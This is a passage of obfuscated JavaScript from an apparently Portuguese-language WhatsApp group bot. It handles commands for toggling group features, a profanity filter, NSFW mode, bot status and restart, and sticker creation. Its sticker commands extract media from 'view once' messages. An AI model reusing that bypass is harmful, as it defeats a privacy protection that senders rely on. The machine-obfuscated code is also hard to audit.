            case "autotranscricao":
            case "autotranscrição":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x48c5d7) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].autotext = true;
                _0x33e29e(_0x3bd584);
                _0x403602("✅ Ativou com sucesso o recurso de auto transcrição de áudio neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x48c5d7) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].autotext = false;
                _0x33e29e(_0x3bd584);
                _0x403602("❌ Desativou com sucesso o recurso de auto transcrição de áudio neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "autobaixar":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x340531) {
                  return _0x403602("Ja esta ativo");
                }
                _0x3bd584[0].autobaixar = true;
                _0x33e29e(_0x3bd584);
                _0x403602("✅ Ativou com sucesso o recurso de auto baixar midias sociais neste grupo 📥");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x48c5d7) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].autobaixar = false;
                _0x33e29e(_0x3bd584);
                _0x403602("❌ Desativou com sucesso o recurso de Auto Baixar Midias Sociais neste grupo ");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "modobrincadeira":
            case "modobrincadeiras":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x23cd8e) {
                  return _0x403602("o modobrincadeira já está ativo");
                }
                _0x3bd584[0].jogos = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🎯 Ativou com sucesso o recurso de Modo brincadeira neste grupo 🪀");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x23cd8e) {
                  return _0x403602("o modobrincadeira já está Desativado");
                }
                _0x3bd584[0].jogos = false;
                _0x33e29e(_0x3bd584);
                _0x403602("🎯 Desativou com sucesso o recurso de Modo brincadeira neste grupo 🪀");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "patente":
            case "level":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              resul = "     \nOlá Usuário -> @" + _0x32e455.split("@")[0] + "\n\n★彡[ " + _0x6965b0 + " ]彡★ Aqui está suas informações: \n\n- Patente : " + _0x39d39e + " \n\n- Level* : " + _0x5b6c65 + "\n\n- Grupo: " + _0x471350;
              const _0x6c5cd9 = {
                text: resul,
                mentions: [_0x32e455]
              };
              const _0x5c64f3 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x6c5cd9, _0x5c64f3);
              break;
            case "leveling":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Ative pressione 1, Desativar pressione 0");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x2ca1df) {
                  return _0x403602("*O recurso de nível já estava ativo antes*");
                }
                _0x3bd584[0].level = true;
                _0x33e29e(_0x3bd584);
                _0x403602(enviar.levelon);
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x2ca1df) {
                  return _0x403602("O recurso de level já está Desativado neste grupo.");
                }
                _0x3bd584[0].level = false;
                _0x33e29e(_0x3bd584);
                _0x403602(enviar.leveloff);
              } else {
                _0x403602("「* Adicionar parâmetro 1 ou 0 ");
              }
              break;
            case "bangp":
            case "unbangp":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (_0x3dec88 == "bangp") {
                if (_0x1f8421) {
                  return _0x403602("Este grupo ja está banido");
                }
                _0x3bd584[0].bangp = true;
                _0x33e29e(_0x3bd584);
                _0x403602("Grupo banido com sucesso");
              } else {
                if (!_0x1f8421) {
                  return _0x403602("Este grupo não está mais banido");
                }
                _0x3bd584[0].bangp = false;
                _0x33e29e(_0x3bd584);
                _0x403602("Grupo desbanido...");
              }
              break;
            case "boton":
            case "botoff":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0xf63551) {
                nescessario.botoff = true;
                _0x130557(nescessario);
                _0x403602("Desativando funções e parando a execução de comandos por membros com sucesso...");
              } else if (_0xf63551) {
                nescessario.botoff = false;
                _0x130557(nescessario);
                _0x403602("Ativando todos os funcionamentos do bot novamente...");
              }
              break;
            case "modonsfw":
            case "modoporno":
            case "nsfw":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ativar ou 0 pra desarivar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x4c8b57) {
                  return _0x403602("O modo nsfw já está ativo");
                }
                _0x3bd584[0].nsfw = true;
                _0x33e29e(_0x3bd584);
                _0x403602("```✓Ativado com sucesso o modo nsfw +18 no grupo``` *" + _0xf7f183.subject + "*");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x4c8b57 && !_0x35021e && !_0x2a5ff3) {
                  return _0x403602("O modo nsfw já está Desativado");
                }
                _0x3bd584[0].nsfw = false;
                _0x33e29e(_0x3bd584);
                _0x403602("```✓Modo Nsfw +18 desativado com sucesso no grupo``` *" + _0xf7f183.subject + "*");
              } else {
                _0x403602("1 para ativar, 0 para desligar");
              }
              break;
            case "antipalavrão":
            case "antipalavrao":
            case "antipalavra":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("[❗] 1 / 0, Exemplo " + (_0x1d93be + _0x3dec88) + " 1");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x3c37ec) {
                  return _0x403602("Ja esta ativo.");
                }
                _0x3bd584[0].antipalavrao.active = true;
                _0x33e29e(_0x3bd584);
                _0x403602("🌀 Ativou com sucesso o recurso de Anti Palavras hardcore neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x3c37ec) {
                  return _0x403602("Ja esta Desativado");
                }
                _0x3bd584[0].antipalavrao.active = false;
                _0x33e29e(_0x3bd584);
                _0x403602("‼️ Desativou com sucesso o recurso de Anti Palavra harcore neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "addpalavra":
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x3c37ec) {
                return _0x403602("Anti palavrão desativado!");
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Use assim : " + (_0x1d93be + _0x3dec88) + " [palavrão]. exemplo " + (_0x1d93be + _0x3dec88) + " puta");
              }
              _0x481435 = _0x40e45c.join(" ").toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
              if (_0x261170.includes(_0x481435)) {
                return _0x403602("Já foi adicionada");
              }
              _0x3bd584[0].antipalavrao.palavras.push(_0x481435);
              _0x33e29e(_0x3bd584);
              _0x403602("Palavrão adicionado com sucesso!");
              break;
            case "delpalavra":
              if (!_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x3c37ec) {
                return _0x403602("Anti palavrão desativado!");
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Use assim : " + (_0x1d93be + _0x3dec88) + " [palavrão]. exemplo " + (_0x1d93be + _0x3dec88) + " puta");
              }
              _0x481435 = _0x40e45c.join(" ").toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
              if (!_0x261170.includes(_0x481435)) {
                return _0x403602("Já foi removida");
              }
              var _0xc3d45a = _0x3bd584[0].antipalavrao.palavras.indexOf(_0x481435);
              _0x3bd584[0].antipalavrao.palavras.splice(_0xc3d45a, 1);
              _0x33e29e(_0x3bd584);
              _0x403602("Palavrão removido da lista com sucesso!");
              break;
            case "listapalavrão":
            case "listapalavra":
            case "listpalavra":
              if (!_0x3c37ec) {
                return _0x403602("Anti palavrão desativado!");
              }
              let _0x254bbd = "Esta é a lista de palavrão\nTotal : " + _0x261170.length + "\n";
              for (let _0x2a7ef0 of _0x261170) {
                _0x254bbd += "➸ " + _0x2a7ef0 + "\n";
              }
              await _0x403602(_0x254bbd);
              break;
            case "limitecaracteres":
            case "limiteflood":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Digite " + (_0x1d93be + _0x3dec88) + " 1 para ativar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x74ce95) {
                  return _0x403602("🌀 O recurso limite de caracteres já está ativo no grupo 🌀");
                }
                _0x3bd584[0].limitec.active = true;
                _0x33e29e(_0x3bd584);
                _0x403602("✔️ O recurso limite de caracteres foi ativado nesse grupo📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x74ce95) {
                  return _0x403602("✔️ O recurso limite de caracteres não está ativado no grupo 📝");
                }
                _0x3bd584[0].limitec.active = false;
                _0x33e29e(_0x3bd584);
                _0x403602("O recurso limite de caracteres foi desativado nesse grupo ✔️");
              } else {
                _0x403602("Digite " + (_0x1d93be + _0x3dec88) + " 1 para ativar, 0 para desativar o recurso");
              }
              break;
            case "limitec_global":
            case "limitec":
              if (!_0x2a5ff3 && !_0x35021e && !_0x594818) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x74ce95) {
                return _0x403602("Ative este recurso primeiro " + _0x1d93be + "limiteflood 1");
              }
              if (!_0x1d6557) {
                return _0x403602("Cade a quantidade? Ex: " + (_0x1d93be + _0x3dec88) + " 5000");
              }
              if (isNaN(_0x1d6557) == true) {
                return _0x403602("Digite apenas números");
              }
              if (_0x3dec88 == "limitec") {
                _0x3bd584[0].limitec.quantidade = _0x1d6557;
                _0x33e29e(_0x3bd584);
                _0x403602("Foi alterado o limite de caracteres para: " + _0x1d6557);
              } else {
                const _0x7386aa = {
                  limitefl: _0x1d6557
                };
                var _0x105f0a = _0x7386aa;
                fs.writeFileSync("./DADOS/usuarios/flood.json", JSON.stringify(_0x105f0a, null, "\t"));
                _0x403602("Foi adicionado um limite global de caracteres de: " + _0x1d6557);
              }
              break;
            case "status":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e && !_0x2a5ff3 && !_0x35021e && !_0x335a29 && !_0x594818) {
                return _0x403602(_0x5c594c);
              }
              statuszada = "╭╼╼╾❲ S T A T U S ❳╼╼╾╮\n│\n│➱ Anti Imagem: " + (_0x416e68 ? "✓" : "✕") + "\n│\n│➱ Anti Vídeo: " + (_0x53df47 ? "✓" : "✕") + "\n│\n│➱ Anti Áudio: " + (_0xb6a765 ? "✓" : "✕") + "\n│\n│➱ Anti Sticker: " + (_0x4233ab ? "✓" : "✕") + "\n│\n│➱ Anti Documento: " + (_0x367ec0 ? "✓" : "✕") + "\n│\n│➱ Anti Contato " + (_0x399715 ? "✓" : "✕") + "\n│\n│➱ Anti Localização: " + (_0x51863c ? "✓" : "✕") + "\n│\n│➱ Anti Link Grupo: " + (_0x44ddae ? "✓" : "✕") + "\n│\n│➱ Anti Porno: " + (_0x2cc1b9 ? "✓" : "✕") + "\n│\n│➱ Anti Link Hard: " + (_0x51b3b7 ? "✓" : "✕") + "\n│\n│➱ Anti Fake: " + (_0x1a630f ? "✓" : "✕") + "\n│\n│➱ Anti Notas: " + (_0x4994fc ? "✓" : "✕") + "\n│\n│➱ Anti Catalogo: " + (_0x169982 ? "✓" : "✕") + "\n│\n│➱ Anti Palavrão: " + (_0x3c37ec ? "✓" : "✕") + "\n│\n│➱ Limite Caracteres: " + (_0x74ce95 ? "✓" : "✕") + "\n│\n│➱ Bem Vindo 1: " + (_0x1146e6 ? "✓" : "✕") + "\n│\n│➱ Bem Vindo 2: " + (_0x57d1c4 ? "✓" : "✕") + "\n│\n│➱ Simi 1: " + (_0x12f03b ? "✓" : "✕") + "\n│\n│➱ Simi 2: " + (_0x452d71 ? "✓" : "✕") + "\n│\n│➱ Auto Sticker: " + (_0x47a927 ? "✓" : "✕") + "\n│\n│➱ Auto Resposta: " + (_0x193ccd ? "✓" : "✕") + "\n│\n│➱ Modo Brincadeira: " + (_0x23cd8e ? "✓" : "✕") + "\n│\n│➱ Modo Puxadas: " + (_0x101fdd ? "✓" : "✕") + "\n│\n│➱ Modo Nsfw: " + (_0x4c8b57 ? "✓" : "✕") + "\n│\n│➱ Modo Rpg: " + (_0x589394 ? "✓" : "✕") + "\n│\n│➱ Anti Ligação: " + (_0x2ea32a ? "✓" : "✕") + "\n│\n│➱ Anti PV Block: " + (_0x2129b6 ? "✓" : "✕") + "\n│\n╰╼╾❲ " + NomeDoBot + " ❳╼╾╯";
              EnvBotao(_0x4f1071, _0x32e455, _0x263319, statuszada, "Leia com atenção", "1|" + logoslink.logo, [_0x1d93be + "ativacoes", "░ MENU DE ATIVAÇÕES ░"], _0xa6b34);
              break;
            case "reiniciar":
              if (!_0x2a5ff3) {
                return;
              }
              setTimeout(async () => {
                _0x403602(NomeDoBot + " Reiniciando...");
                setTimeout(async () => {
                  process.exit();
                }, 1200);
              }, 1000);
              break;
            case "emoji":
            case "semoji":
              try {
                if (!_0x1d6557.trim()) {
                  return _0x403602("Exemplo: " + _0x1d93be + "emoji ☹️/whatsapp");
                }
                var [_0x649d5c, _0x47a5df] = _0x1d6557.split("/");
                ABC = await fetchJson("https://api.bronxyshost.com.br/api-bronxys/emoji?q=" + _0x649d5c + "/" + _0x47a5df.toLowerCase() + "&apikey=" + _0x44a335);
                _0x5b87bd(_0x4f1071, ABC.rst);
              } catch {
                return _0x403602("" + infoerror);
              }
              break;
            case "emoji-mix":
            case "emojimix":
              var [_0x578c2e, _0x51bf13] = _0x1d6557.trim().split("+");
              if (!_0x1d6557.includes("+")) {
                return _0x403602("Olá, está faltando o +\nExemplo: " + (_0x1d93be + _0x3dec88) + " 👿+😇");
              }
              try {
                _0x403602(enviar.espere);
                _0x5b87bd(_0x4f1071, SITE_JEFF_APIS + "/api/emojimix?emoji1=" + encodeURI(_0x578c2e) + "&emoji2=" + encodeURI(_0x51bf13) + "&apikey=" + _0x512d5e);
              } catch (_0x171332) {
                if (JSON.stringify(_0x171332).includes(_0x512d5e)) {
                  return console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
                } else {
                  _0x403602("*Ops não foi possivel fazer esse mix de emoji / Ou ocorreu algum problema no sistema..*");
                }
              }
              break;
            case "figfundo":
            case "figvideo":
            case "figusemfundo":
            case "sfundo":
              if ((_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) && !_0x1d6557.length <= 1) {
                rafa = _0x10f925 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : _0x302296.message.imageMessage;
                _0x403602(enviar.espere);
                if (_0x3fb600) {
                  setTimeout(async () => {
                    await _0x4b05d2(2, _0x32e455);
                  }, 1000);
                }
                buff = await getFileBuffer(rafa, "image");
                bas64 = "data:image/jpeg;base64," + buff.toString("base64");
                anu = _0x40e45c.join(" ").split("|");
                satu = anu[0] !== "" ? anu[0] : "" + _0x55a6ac;
                sd = "📍Criado por↓        " + NomeDoBot;
                dua = typeof anu[1] !== "undefined" ? anu[1] : "" + sd;
                var _0x177e90 = await convertSticker(bas64, "" + dua, "" + satu);
                var _0xc1a084 = new Buffer.from(_0x177e90, "base64");
                const _0x56e954 = {
                  sticker: _0xc1a084
                };
                const _0x5d95b0 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x56e954, _0x5d95b0);
              } else {
                return _0x403602("So imagem mn -_-");
              }
              break;
            case "jeff":
              if (!_0x1785a1) {
                return _0x403602("Marque uma figurinha...");
              }
              try {
                const _0x332083 = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "sticker");
                _0x403602(enviar.espere);
                const _0x1404fe = "data:image/jpeg;base64," + _0x332083.toString("base64");
                const _0x228c74 = new Sticker();
                _0x228c74.addFile(Buffer.from(_0x332083));
                _0x228c74.options.metadata = {
                  pack: "@JEFFERSON_DDOS",
                  author: "SEGUE AI",
                  emojis: ["🤠", "🥶", "😻"]
                };
                const _0x3d7e59 = await _0x228c74.start();
                const _0x5e5be4 = fs.readFileSync(_0x3d7e59[0].value);
                const _0x99cdfb = {
                  sticker: _0x5e5be4,
                  contextInfo: {}
                };
                _0x99cdfb.contextInfo.externalAdReply = {};
                _0x99cdfb.contextInfo.externalAdReply.title = "SEGUE AI @JEFFERSON_DDOS";
                _0x99cdfb.contextInfo.externalAdReply.body = "";
                _0x99cdfb.contextInfo.externalAdReply.previewType = "PHOTO";
                _0x99cdfb.contextInfo.externalAdReply.thumbnail = _0x5e5be4;
                const _0x221524 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x99cdfb, _0x221524);
                fs.unlinkSync(_0x3d7e59[0].value);
              } catch (_0x40ad68) {
                console.error("Erro ao processar o sticker:", _0x40ad68);
                _0x403602("❎ Erro, tenta mais tarde");
              }
              break;
            case "juu":
              if (!_0x1785a1) {
                return _0x403602("Marque uma figurinha...");
              }
              try {
                const _0x2b2e14 = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "sticker");
                _0x403602(enviar.espere);
                const _0x581cb4 = "data:image/jpeg;base64," + _0x2b2e14.toString("base64");
                const _0x1f248d = new Sticker();
                _0x1f248d.addFile(Buffer.from(_0x2b2e14));
                _0x1f248d.options.metadata = {
                  pack: "❤️",
                  author: "Souzaxss7",
                  emojis: ["🤠", "🥶", "😻"]
                };
                const _0x58a311 = await _0x1f248d.start();
                const _0x2517d8 = fs.readFileSync(_0x58a311[0].value);
                const _0x145b6e = {
                  sticker: _0x2517d8,
                  contextInfo: {}
                };
                _0x145b6e.contextInfo.externalAdReply = {};
                _0x145b6e.contextInfo.externalAdReply.title = "Souzaxss7 ❤‍";
                _0x145b6e.contextInfo.externalAdReply.body = "";
                _0x145b6e.contextInfo.externalAdReply.previewType = "PHOTO";
                _0x145b6e.contextInfo.externalAdReply.thumbnail = _0x2517d8;
                const _0x4f63ce = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x145b6e, _0x4f63ce);
                fs.unlinkSync(_0x58a311[0].value);
              } catch (_0x541e43) {
                console.error("Erro ao processar o sticker:", _0x541e43);
                _0x403602("❎ Erro, tenta mais tarde");
              }
              break;
            case "talles":
              if (!_0x1785a1) {
                return _0x403602("Marque uma figurinha...");
              }
              try {
                const _0x1adab2 = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "sticker");
                _0x403602(enviar.espere);
                const _0x37009a = "data:image/jpeg;base64," + _0x1adab2.toString("base64");
                const _0x924e6e = new Sticker();
                _0x924e6e.addFile(Buffer.from(_0x1adab2));
                _0x924e6e.options.metadata = {
                  pack: "𝖙𝖆𝖑𝖑𝖊𝖘 𝖜𝖝𝖑",
                  author: "🤔",
                  emojis: ["🤠", "🥶", "😻"]
                };
                const _0x29108d = await _0x924e6e.start();
                const _0x452d48 = fs.readFileSync(_0x29108d[0].value);
                const _0x573100 = {
                  sticker: _0x452d48,
                  contextInfo: {}
                };
                _0x573100.contextInfo.externalAdReply = {};
                _0x573100.contextInfo.externalAdReply.title = "𝖙𝖆𝖑𝖑𝖊𝖘 𝖜𝖝𝖑  🤔";
                _0x573100.contextInfo.externalAdReply.body = "";
                _0x573100.contextInfo.externalAdReply.previewType = "PHOTO";
                _0x573100.contextInfo.externalAdReply.thumbnail = _0x452d48;
                const _0x2cde1c = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x573100, _0x2cde1c);
                fs.unlinkSync(_0x29108d[0].value);
              } catch (_0x5c0ddb) {
                console.error("Erro ao processar o sticker:", _0x5c0ddb);
                _0x403602("❎ Erro, tenta mais tarde");
              }
              break;
            case "abraaosx":
              if (!_0x1785a1) {
                return _0x403602("Marque uma figurinha...");
              }
              try {
                const _0x223156 = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "sticker");
                _0x403602(enviar.espere);
                const _0x3132c6 = "data:image/jpeg;base64," + _0x223156.toString("base64");
                const _0x13721e = new Sticker();
                _0x13721e.addFile(Buffer.from(_0x223156));
                _0x13721e.options.metadata = {
                  pack: "👾",
                  author: "Abraão",
                  emojis: ["🤠", "🥶", "😻"]
                };
                const _0x36b681 = await _0x13721e.start();
                const _0x28e035 = fs.readFileSync(_0x36b681[0].value);
                const _0x37677f = {
                  sticker: _0x28e035,
                  contextInfo: {}
                };
                _0x37677f.contextInfo.externalAdReply = {};
                _0x37677f.contextInfo.externalAdReply.title = "Aʙʀᴀᴀ̃ᴏ ";
                _0x37677f.contextInfo.externalAdReply.body = "";
                _0x37677f.contextInfo.externalAdReply.previewType = "PHOTO";
                _0x37677f.contextInfo.externalAdReply.thumbnail = _0x28e035;
                const _0x3ed0d1 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x37677f, _0x3ed0d1);
                fs.unlinkSync(_0x36b681[0].value);
              } catch (_0x2b2f7f) {
                console.error("Erro ao processar o sticker:", _0x2b2f7f);
                _0x403602("❎ Erro, tenta mais tarde");
              }
              break;
            case "roubar":
            case "rename":
            case "swm":
              const _0x414d71 = {
                reagir: "😾"
              };
              if (!_0x1785a1) {
                return await _0x403602("Marqur um *STICKER* com *" + (_0x1d93be + _0x3dec88) + "* pack/autor - Renomeia o nome do pack e do autor do sticker.", _0x414d71);
              }
              try {
                let [_0x109b5a, _0x49addd] = _0x1d6557.split("/");
                const _0x50fe97 = {
                  reagir: "😿"
                };
                if (!_0x109b5a || !_0x49addd) {
                  return await _0x403602("Responda um *STICKER* com *" + (_0x1d93be + _0x3dec88) + "* pack/autor - Renomeia o nome do pack e do autor do sticker.", _0x50fe97);
                }
                zzbuffer = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "sticker");
                const _0x3524e8 = new Sticker();
                _0x3524e8.addFile(zzbuffer);
                const _0x2fe9c5 = {
                  pack: _0x109b5a,
                  author: _0x49addd,
                  emojis: ["🤠", "🥶", "😻"]
                };
                _0x3524e8.options.metadata = _0x2fe9c5;
                resultadoSt = await _0x3524e8.start();
                const _0x59fa72 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, {
                  sticker: fs.readFileSync(resultadoSt[0].value)
                }, _0x59fa72);
                setTimeout(async () => {
                  await fs.unlinkSync(resultadoSt[0].value);
                }, 1000);
              } catch (_0x55581e) {
                const _0xc68d6d = {
                  reagir: "😿"
                };
                await _0x403602(_0x55581e, _0xc68d6d);
              }
              break;
            case "fstiker":
            case "fsticker":
            case "f":
              if (_0x3fb600) {
                setTimeout(async () => {
                  _0x4b05d2(1, _0x32e455);
                }, 1000);
              }
              var _0x3fc9f = _0x302296.message?.extendedTextMessage?.contextInfo?.quotedMessage;
              var _0xbbe906 = _0x3fc9f?.imageMessage || _0x302296.message?.imageMessage || _0x3fc9f?.viewOnceMessageV2?.message?.imageMessage || _0x302296.message?.viewOnceMessageV2?.message?.imageMessage || _0x302296.message?.viewOnceMessage?.message?.imageMessage || _0x3fc9f?.viewOnceMessage?.message?.imageMessage;
              var _0x2ea5f9 = _0x3fc9f?.videoMessage || _0x302296.message?.videoMessage || _0x3fc9f?.viewOnceMessageV2?.message?.videoMessage || _0x302296.message?.viewOnceMessageV2?.message?.videoMessage || _0x302296.message?.viewOnceMessage?.message?.videoMessage || _0x3fc9f?.viewOnceMessage?.message?.videoMessage;
              if (_0xbbe906) {
                var _0x584479 = "🗣 ⇝ Solicitado por:\n🤖 ⇝ Bot:\n🧙‍ ⇝ Dono:\n🔗 ⇝ Site: \nbit.ly/bots-whats";
                var _0x533577 = "🗣" + _0x55a6ac + "\n🤖" + NomeDoBot + "\n🧙‍" + NickDono;
                owgi = await getFileBuffer(_0xbbe906, "image");
                const _0xf84479 = {
                  packname: _0x584479,
                  author: _0x533577
                };
                let _0x16b846 = await sendImageAsSticker(_0x263319, _0x4f1071, owgi, _0x302296, _0xf84479);
                await DLT_FL(_0x16b846);
              } else if (_0x2ea5f9 && _0x2ea5f9?.seconds < 11) {
                var _0x584479 = "🗣 ⇝ Solicitado por:\n🤖 ⇝ Bot:\n🧙‍ ⇝ Dono:\n🔗 ⇝ Site: \nbit.ly/bots-whats";
                var _0x533577 = "🗣" + _0x55a6ac + "\n🤖" + NomeDoBot + "\n🧙‍" + NickDono;
                owgi = await getFileBuffer(_0x2ea5f9, "video");
                const _0x149d44 = {
                  packname: _0x584479,
                  author: _0x533577
                };
                let _0x2c06db = await sendVideoAsSticker(_0x263319, _0x4f1071, owgi, _0x302296, _0x149d44);
                await DLT_FL(_0x2c06db);
              } else {
                _0x403602("Enviar imagem / vídeo / gif com legenda \n" + _0x1d93be + "sticker (duração do adesivo de vídeo de 1 a 10 segundos)");
              }
              break;
            case "figu":
              if (fs.existsSync(_0x514900)) {
                return _0x403602("Aguarde um momento, e realize o pedido novamente, não seja tão rápido...");
              }
              var _0x514900 = "./DADOS/usuarios/data/CVF.json";
              fs.writeFileSync(_0x514900, JSON.stringify([_0x10f925 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : _0x302296.message.imageMessage || _0x5760e9 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : _0x302296.message.videoMessage]));
              var _0x3fdc99 = JSON.parse(fs.readFileSync(_0x514900));
              var _0x307e66 = _0x3fdc99[0];
              _0x307e66.sticker = {
                url: _0x307e66.url
              };
              await delay(1200);
              DLT_FL(_0x514900);
              _0x263319.sendMessage(_0x4f1071, _0x307e66);
              break;
            case "st":
            case "stk":
            case "sticker":
            case "s":
              if (_0x3fb600) {
                setTimeout(async () => {
                  _0x4b05d2(1, _0x32e455);
                }, 1000);
              }
              var _0x3fc9f = _0x302296.message?.extendedTextMessage?.contextInfo?.quotedMessage;
              var _0x2ea5f9 = _0x3fc9f?.imageMessage || _0x302296.message?.imageMessage || _0x3fc9f?.viewOnceMessageV2?.message?.imageMessage || _0x302296.message?.viewOnceMessageV2?.message?.imageMessage || _0x302296.message?.viewOnceMessage?.message?.imageMessage || _0x3fc9f?.viewOnceMessage?.message?.imageMessage;
              var _0xbbe906 = _0x3fc9f?.videoMessage || _0x302296.message?.videoMessage || _0x3fc9f?.viewOnceMessageV2?.message?.videoMessage || _0x302296.message?.viewOnceMessageV2?.message?.videoMessage || _0x302296.message?.viewOnceMessage?.message?.videoMessage || _0x3fc9f?.viewOnceMessage?.message?.videoMessage;
              if (_0x2ea5f9) {
                var _0x584479 = "🗣 ⇝ Solicitado por:\n🤖 ⇝ Bot:\n🧙‍ ⇝ Dono:\n🔗 ⇝ Site: \nbit.ly/bots-whats";
                var _0x533577 = "🗣" + _0x55a6ac + "\n🤖" + NomeDoBot + "\n🧙‍" + NickDono;
                owgi = await getFileBuffer(_0x2ea5f9, "image");
                const _0x3c2b02 = {
                  packname: _0x584479,
                  author: _0x533577
                };
                let _0x5297e1 = await sendImageAsSticker2(_0x263319, _0x4f1071, owgi, _0x302296, _0x3c2b02);
                await DLT_FL(_0x5297e1);
              } else if (_0xbbe906 && _0xbbe906.seconds < 11) {
                var _0x584479 = "🗣 ⇝ Solicitado por:\n🤖 ⇝ Bot:\n🧙‍ ⇝ Dono:\n🔗 ⇝ Site: \nbit.ly/bots-whats";
                var _0x533577 = "🗣" + _0x55a6ac + "\n🤖" + NomeDoBot + "\n🧙‍" + NickDono;
                owgi = await getFileBuffer(_0xbbe906, "video");
                const _0x1c4821 = {
                  packname: _0x584479,
                  author: _0x533577
                };
                let _0x405906 = await sendVideoAsSticker2(_0x263319, _0x4f1071, owgi, _0x302296, _0x1c4821);
                await DLT_FL(_0x405906);
              } else {
                return _0x403602("Marque uma imagem, ou um vídeo de ate 10 segundos, ou uma visualização única, para fazer figurinha, com o comando " + (_0x1d93be + _0x3dec88));
              }
              break;
            case "toimg":
              if (!_0x1785a1) {
                return _0x403602("❌ adesivo de resposta um ❌");
              }
              try {
                _0x403602(enviar.espere);
                if (_0x3fb600) {
                  setTimeout(async () => {
                    _0x4b05d2(1, _0x32e455);
                  }, 1000);
                }
